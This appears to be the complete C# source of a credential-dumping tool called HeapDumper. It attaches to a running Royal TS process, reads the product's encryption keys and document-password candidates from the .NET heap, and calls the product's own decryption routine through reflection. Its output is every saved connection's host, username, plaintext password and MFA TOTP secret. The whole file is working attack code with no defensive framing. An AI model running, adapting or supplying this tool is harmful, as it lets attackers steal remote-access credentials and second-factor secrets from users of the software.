using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

class Program
{
    static Dictionary<string, string> ReadKvStore(ClrObject obj)
    {
        var kv = new Dictionary<string, string>();
        try {
            var kvStore = obj.ReadObjectField("_keyValueStore");
            if (!kvStore.IsValid || kvStore.Type == null) return kv;
            var entries = kvStore.ReadObjectField("_entries");
            if (!entries.IsValid || entries.Type == null || !entries.Type.IsArray) return kv;
            var arr = entries.AsArray();
            for (int i = 0; i < arr.Length; i++)
            {
                try {
                    var sv = arr.GetStructValue(i);
                    var ko = sv.ReadObjectField("key");
                    var vo = sv.ReadObjectField("value");
                    if (ko.IsValid && ko.AsString() != null)
                        kv[ko.AsString()!] = vo.IsValid ? (vo.AsString() ?? "") : "";
                } catch {}
            }
        } catch {}
        return kv;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: HeapDumper <PID> <RoyalTSInstallDir>"); return; }
        int pid = int.Parse(args[0]);
        string rtDir = args[1];

        Console.WriteLine($"[*] Attaching to PID {pid}...");
        using var target = DataTarget.AttachToProcess(pid, false);

        foreach (var clrInfo in target.ClrVersions)
        {
            Console.WriteLine($"[*] CLR {clrInfo.Version}");
            ClrRuntime runtime;
            try {
                runtime = clrInfo.CreateRuntime();
            } catch {
                // Fallback for air-gapped systems: find DAC locally instead of symbol server
                var clrPath = clrInfo.ModuleInfo.FileName;
                if (!string.IsNullOrEmpty(clrPath)) {
                    var dacPath = Path.Combine(Path.GetDirectoryName(clrPath)!, "mscordaccore.dll");
                    Console.WriteLine($"[*] Symbol server failed, using local DAC: {dacPath}");
                    runtime = clrInfo.CreateRuntime(dacPath);
                } else {
                    throw;
                }
            }
            var heap = runtime.Heap;
            Console.WriteLine($"[*] Scanning heap...");

            string siKey1 = "", siKey2 = "", siDoc = "";
            var docPwdCandidates = new List<string> { "" };

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn1 = obj.Type.Name ?? "";

                if (tn1 == "RoyalDocumentLibrary.RoyalSecurityInterface")
                {
                    try { var f1 = obj.ReadStringField("smhos"); if (!string.IsNullOrEmpty(f1)) siKey1 = f1; } catch {}
                    try { var f2 = obj.ReadStringField("smhot"); if (!string.IsNullOrEmpty(f2)) siKey2 = f2; } catch {}
                    try { var f3 = obj.ReadStringField("smhou"); if (!string.IsNullOrEmpty(f3)) siDoc = f3; } catch {}
                    continue;
                }

                if (tn1 == "Zxcvbn.Result")
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        try {
                            if (f.ElementType == ClrElementType.String)
                            {
                                var fn = (f.Name ?? "").TrimStart('_', '<').Replace(">k__BackingField", "").ToLowerInvariant();
                                if (fn.Contains("password"))
                                {
                                    var val = obj.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                        docPwdCandidates.Add(val);
                                }
                            }
                        } catch {}
                    }
                    continue;
                }
            }

            if (string.IsNullOrEmpty(siKey1))
            {
                Console.WriteLine("[!] No SecurityInterface keys found on heap");
                Console.WriteLine("\n##RESULTS_START##\n##RESULTS_END##");
                return;
            }
            Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
            Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");

            var entries = new List<(string type, string name, string host, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";
                if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;
                if (!(tn.Contains("Credential") || tn.Contains("Connection")) || tn.EndsWith("[]")) continue;

                var kv = ReadKvStore(obj);
                string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                if (string.IsNullOrEmpty(encPwd)) continue;

                string name = "", host = "", user = "";
                kv.TryGetValue("Name", out name); name ??= "";
                kv.TryGetValue("UserName", out user); user ??= "";
                if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
                kv.TryGetValue("ComputerName", out host); host ??= "";
                if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }

                string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
                string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
                string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
                if (mfaCfg != "0" && mfaCfg != "") {
                    string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
                    otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
                    kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
                    if (otpDigits == "0") otpDigits = "6";
                    kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
                    kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
                }

                string docName = "";
                try {
                    var doc = obj.ReadObjectField("_royalDocument");
                    if (doc.IsValid && doc.Type != null) {
                        var dkv = ReadKvStore(doc);
                        dkv.TryGetValue("Name", out docName); docName ??= "";
                    }
                } catch {}

                entries.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
            }

            var unique = entries.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
            Console.WriteLine($"[*] Found {unique.Count} entry(ies) with encrypted passwords");

            AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
                return File.Exists(p) ? Assembly.LoadFrom(p) : null;
            };

            object? siInst = null;
            MethodInfo? decMethod = null;
            try {
                var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                siInst = Activator.CreateInstance(siType);
                siType.GetField("smhos", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey1);
                siType.GetField("smhot", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey2);
                siType.GetField("smhou", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siDoc);
                decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
                Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
            }

            foreach (var x in unique) {
                if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
            }

            Console.WriteLine("\n##RESULTS_START##");

            var knownDocPwd = new Dictionary<string, string>();

            foreach (var e in unique)
            {
                string plainPwd = "", plainTotp = "", usedDp = "";
                if (decMethod != null && siInst != null)
                {
                    string cachedDp = "";
                    if (!string.IsNullOrEmpty(e.docName) && knownDocPwd.TryGetValue(e.docName, out cachedDp))
                    {
                        try {
                            plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, cachedDp }) ?? "");
                            if (!string.IsNullOrEmpty(plainPwd)) usedDp = cachedDp;
                        } catch {}
                    }

                    if (string.IsNullOrEmpty(plainPwd))
                    {
                        foreach (var dp in docPwdCandidates)
                        {
                            try {
                                plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, dp }) ?? "");
                                if (!string.IsNullOrEmpty(plainPwd)) { usedDp = dp; break; }
                            } catch {}
                        }
                    }

                    if (!string.IsNullOrEmpty(plainPwd) && !string.IsNullOrEmpty(e.docName))
                        knownDocPwd[e.docName] = usedDp;

                    if (!string.IsNullOrEmpty(e.encTotp))
                    {
                        try {
                            plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? "");
                        } catch {}
                    }
                }
                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
            }

            Console.WriteLine("##RESULTS_END##");
        }
    }
}
